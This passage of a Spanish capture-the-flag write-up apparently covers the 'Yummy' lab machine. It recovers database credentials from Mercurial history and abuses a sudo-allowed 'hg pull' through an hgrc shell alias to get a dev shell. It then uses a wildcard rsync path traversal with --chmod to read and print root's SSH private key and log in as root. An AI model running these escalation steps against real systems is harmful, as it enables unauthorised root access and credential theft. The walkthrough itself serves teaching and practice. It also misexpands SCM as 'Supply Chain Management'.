+drwx------  3 root     root         4096 Feb 24 17:21 systemd-private-cc18953525744e65a0a87213250b7daf-systemd-resolved.service-ymrxh5
+drwx------  3 root     root         4096 Feb 24 17:21 systemd-private-cc18953525744e65a0a87213250b7daf-systemd-timesyncd.service-T2DQvi
+drwx------  3 root     root         4096 Feb 24 18:19 systemd-private-cc18953525744e65a0a87213250b7daf-upower.service-aHSUmC
+drwx------  2 root     root         4096 Feb 24 17:25 vmware-root_690-2697074069
+drwxrwxrwt  2 root     root         4096 Feb 24 17:21 .X11-unix
+drwxrwxrwt  2 root     root         4096 Feb 24 17:21 .XIM-unix
+```
+
+El directorio en cuestión tiene una estructura similar al de la otra web, sin embargo hay un directorio `.hg`:
+
+```bash
+mysql@yummy:/tmp/var/www/app-qatesting$ ls -la
+total 40
+drwxrwx--- 7 mysql mysql  4096 May 28  2024 .
+drwxrwxr-x 3 mysql mysql  4096 Feb 24 21:03 ..
+-rw-rw-r-- 1 mysql mysql 10852 May 28  2024 app.py
+drwxr-xr-x 3 mysql mysql  4096 May 28  2024 config
+drwxrwxr-x 6 mysql mysql  4096 May 28  2024 .hg
+drwxr-xr-x 3 mysql mysql  4096 May 28  2024 middleware
+drwxr-xr-x 6 mysql mysql  4096 May 28  2024 static
+drwxr-xr-x 2 mysql mysql  4096 May 28  2024 templates
+```
+
+Esta carpeta es creada por el software llamado Mercurial, que funciona como un software SCM (Supply Chain Management)
+
+Por suerte, la máquina lo tiene instalado:
+
+```bash
+mysql@yummy:/tmp/var/www/app-qatesting$ hg
+Mercurial Distributed SCM
+
+basic commands:
+
+ add           add the specified files on the next commit
+ annotate      show changeset information by line for each file
+ clone         make a copy of an existing repository
+ commit        commit the specified files or all outstanding changes
+ diff          diff repository (or selected files)
+ export        dump the header and diffs for one or more changesets
+ forget        forget the specified files on the next commit
+ init          create a new repository in the given directory
+ log           show revision history of entire repository or files
+ merge         merge another revision into working directory
+ pull          pull changes from the specified source
+ push          push changes to the specified destination
+ remove        remove the specified files on the next commit
+ serve         start stand-alone webserver
+ status        show changed files in the working directory
+ summary       summarize working directory state
+ update        update working directory (or switch revisions)
+
+(use 'hg help' for the full list of commands or 'hg -v' for details)
+```
+
+Viendo los logs, podemos ver algunos cambios interesantes:
+
+```bash
+changeset:   9:f3787cac6111
+tag:         tip
+user:        qa
+date:        Tue May 28 10:37:16 2024 -0400
+summary:     attempt at patching path traversal
+
+changeset:   8:0bbf8464d2d2
+user:        qa
+date:        Tue May 28 10:34:38 2024 -0400
+summary:     removed comments
+
+changeset:   7:2ec0ee295b83
+user:        qa
+date:        Tue May 28 10:32:50 2024 -0400
+summary:     patched SQL injection vuln
+
+changeset:   6:f87bdc6c94a8
+user:        qa
+date:        Tue May 28 10:27:32 2024 -0400
+summary:     patched signature vuln
+
+changeset:   5:6c59496d5251
+user:        dev
+date:        Tue May 28 10:25:11 2024 -0400
+summary:     updated db creds
+
+changeset:   4:f228abd7a139
+user:        dev
+date:        Tue May 28 10:24:32 2024 -0400
+summary:     randomized secret key
+```
+
+El changeset `8:0bbf8464d2d2` contiene algo interesante en su diff:
+
+```bash
+diff -r 2ec0ee295b83 -r 0bbf8464d2d2 app.py
+--- a/app.py    Tue May 28 10:32:50 2024 -0400
++++ b/app.py    Tue May 28 10:34:38 2024 -0400
+@@ -19,8 +19,8 @@
+ 
+ db_config = {
+     'host': '127.0.0.1',
+-    'user': 'chef',
+-    'password': '3wDo7gSRZIwIHRxZ!',
++    'user': 'qa',
++    'password': 'jPAd!XQCtn8Oc@2B',
+     'database': 'yummy_db',
+     'cursorclass': pymysql.cursors.DictCursor,
+     'client_flag': CLIENT.MULTI_STATEMENTS
+... [snip]
+```
+
+Esta contraseña es válida para el usuario qa.
+
+```bash
+mysql@yummy:/tmp/var/www/app-qatesting$ su qa
+Password: 
+qa@yummy:/tmp/var/www/app-qatesting$
+```
+
+En su directorio personal encontraremos la primera flag.
+
+```bash
+qa@yummy:/tmp/var/www/app-qatesting$ cd ~
+qa@yummy:~$ ls -la
+total 44
+drwxr-x--- 6 qa   qa   4096 Sep 30 07:22 .
+drwxr-xr-x 4 root root 4096 May 27  2024 ..
+lrwxrwxrwx 1 root root    9 May 27  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 qa   qa    220 Mar 31  2024 .bash_logout
+-rw-r--r-- 1 qa   qa   3771 May 27  2024 .bashrc
+drwx------ 2 qa   qa   4096 Sep 30 07:22 .cache
+drwx------ 3 qa   qa   4096 May 28  2024 .gnupg
+-rw-rw-r-- 1 qa   qa    728 May 29  2024 .hgrc
+drwxrwxr-x 3 qa   qa   4096 May 27  2024 .local
+-rw-r--r-- 1 qa   qa    807 Mar 31  2024 .profile
+drwx------ 2 qa   qa   4096 May 28  2024 .ssh
+-rw-r----- 1 root qa     33 Feb 24 17:25 user.txt
+qa@yummy:~$ cat user.txt
+4c581f2d60fa4b5d78b6769b87******
+```
+
+## Escalada de privilegios
+
+### dev - yummy
+
+Tenemos un privilegio de sudo para ejecutar comandos como dev:
+
+```bash
+qa@yummy:~$ sudo -l
+[sudo] password for qa: 
+Matching Defaults entries for qa on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User qa may run the following commands on localhost:
+    (dev : dev) /usr/bin/hg pull /home/dev/app-production/
+```
+
+Vale, al ejecutar esto simplemente nos traerá el repositorio del uĺtimo argumento a nuestro directorio... pero primero debemos tener un repositorio ya creado que recibirá los changesets en cuestión:
+
+```bash
+a@yummy:/tmp/uwu$ hg init
+qa@yummy:/tmp/uwu$ ls -la
+total 12
+drwxrwxrwx  3 qa   qa   4096 Feb 24 21:16 .
+drwxrwxrwt 17 root root 4096 Feb 24 21:14 ..
+drwxrwxr-x  5 qa   qa   4096 Feb 24 21:16 .hg
+```
+
+La parte curiosa es que si o si tenemos que tener un repositorio creado. Recordemos que git tiene los bien conocido hooks que nos permiten especificar comandos a ejecutar cuando se haga algo sobre el repositorio, ya sea un pull, commit, push... etc. ¿Mercurial tendrá lo mismo?
+
+Este software por defecto busca un archivo llamado `hgrc` en rutas especificas y lo lee en caso de existir, que debe estar en la raíz del repositorio. Sirve para especificarle ajustes especiales al Mercurial y podemos [encontrar información del archivo acá](https://www.mercurial-scm.org/doc/hgrc.5.html)
+
+Lo realmente interesante es que podemos redefinir las acciones de los comandos del software con comandos del sistema dentro de la sección `alias`:
+
+> An alias can start with an exclamation point (!) to make it a shell alias. A shell alias is executed with the shell and will let you run arbitrary commands. As an example,
+>
+> echo = !echo $@
+>
+> will let you do hg echo foo to have foo printed in your terminal. A better example might be:
+>
+> purge = !$HG status --no-status --unknown -0 re: | xargs -0 rm -f
+>
+> which will make hg purge delete all unknown files in the repository in the same manner as the purge extension.
+
+Entonces, si creamos esto:
+
+```conf
+[alias]
+pull = !bash
+```
+{: file=".hg/hgrc" }
+
+Al hacerle pull al repositorio con sudo:
+
+```bash
+qa@yummy:/tmp/uwu$ sudo -u dev /usr/bin/hg pull /home/dev/app-production/
+I'm out of office until February 25th, don't call me
+dev@yummy:/tmp/uwu$
+```
+
+> No está en las oficinas de la compañia... excelente.
+{: .prompt-info }
+
+### root - yummy
+
+Podemos ejecutar rsync como root:
+
+```bash
+dev@yummy:/tmp/uwu$ sudo -l
+Matching Defaults entries for dev on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User dev may run the following commands on localhost:
+    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/
+```
+
+Por el asterisco podemos retroceder directorios, y hacer esto por ejemplo:
+
+```bash
+dev@yummy:~/app-production$ sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/../../../root/.ssh/id_rsa /opt/app/
+dev@yummy:~/app-production$ ls -la /opt/app
+total 44
+drwxrwxr-x 7 root     www-data  4096 Feb 24 21:31 .
+drwxr-xr-x 3 root     root      4096 Sep 30 08:16 ..
+-rw-r--r-- 1 root     root     11979 Sep 25 13:54 app.py
+drwxr-xr-x 3 root     root      4096 Sep 30 08:16 config
+-rw------- 1 root     root       399 May 28  2024 id_rsa
+drwxr-xr-x 3 root     root      4096 Sep 30 08:16 middleware
+drwxrwxr-x 2 www-data www-data  4096 Sep 30 08:16 __pycache__
+drwxr-xr-x 6 root     root      4096 Sep 30 08:16 static
+drwxr-xr-x 2 root     root      4096 Sep 30 08:16 templates
+```
+
+Sin embargo, nos copia la id_rsa con los permisos por defecto. (root:600)
+
+Pero, `rsync` permite especificar opciones en cualquier parte de los argumentos, por lo que podemos agregar en medio de los dos últimos argumentos esto:
+
+```bash
+dev@yummy:~/app-production$ rsync --help
+... [snip]
+--chmod=CHMOD            affect file and/or directory permissions
+... [snip]
+```
+
+Entonces:
+
+```bash
+dev@yummy:~$ sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/../../../root/.ssh/id_rsa --chmod=777 /opt/app/
+dev@yummy:~$ ls -la /opt/app
+total 44
+drwxrwxr-x 7 root www-data  4096 Feb 24 21:36 .
+drwxr-xr-x 3 root root      4096 Sep 30 08:16 ..
+-rw-r--r-- 1 root root     11979 Sep 25 13:54 app.py
+drwxr-xr-x 3 root root      4096 May 17  2024 config
+-rwxrwxrwx 1 root root       399 May 28  2024 id_rsa
+drwxr-xr-x 3 root root      4096 May 16  2024 middleware
+drwxrwxr-x 2 root root      4096 Sep 25 14:00 __pycache__
+drwxr-xr-x 6 root root      4096 May 14  2024 static
+drwxr-xr-x 2 root root      4096 Sep 25 13:58 templates
+dev@yummy:~$ cat /opt/app/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD8t/wsFHnXuKZw6GVUmPSPPHtqxx1N94baTt1/2esF8AAAAJBdGlFYXRpR
+WAAAAAtzc2gtZWQyNTUxOQAAACD8t/wsFHnXuKZw6GVUmPSPPHtqxx1N94baTt1/2esF8A
+AAAEA+trd9XqxX3ZSG9ESLlPSzIadF8ll0l4ll0+DKkhpkhvy3/CwUede4pnDoZVSY9I88
+e2rHHU33htpO3X/Z6wXwAAAACnJvb3RAeXVtbXkBAgM=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Ahora podemos autenticarnos como root y tomar la última flag.
+
+```bash
+dev@yummy:~$ ssh -i uwu.rsa root@127.0.0.1
+The authenticity of host '127.0.0.1 (127.0.0.1)' cant be established.
+ED25519 key fingerprint is SHA256:9fd19UBqhgUKmJ38ElChUROBxqbSG6pvPPpk4IB4xM4.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-31-generic x86_64)
+... [snip]
+root@yummy:~# ls -la
+total 36
+drwx------  6 root root 4096 Feb 24 17:25 .
+drwxr-xr-x 24 root root 4096 Sep 30 08:16 ..
+lrwxrwxrwx  1 root root    9 May 15  2024 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
+drwx------  2 root root 4096 Sep 30 10:05 .cache
+drwxr-xr-x  3 root root 4096 Sep 30 08:16 .local
+-rw-r--r--  1 root root  161 Apr 22  2024 .profile
+-rw-r-----  1 root root   33 Feb 24 17:25 root.txt
+drwxr-xr-x  2 root root 4096 Sep 30 08:16 scripts
+drwx------  2 root root 4096 Sep 30 08:16 .ssh
+root@yummy:~# cat root.txt
+2ab0daf5f551a65f7efd7701ab******
+```
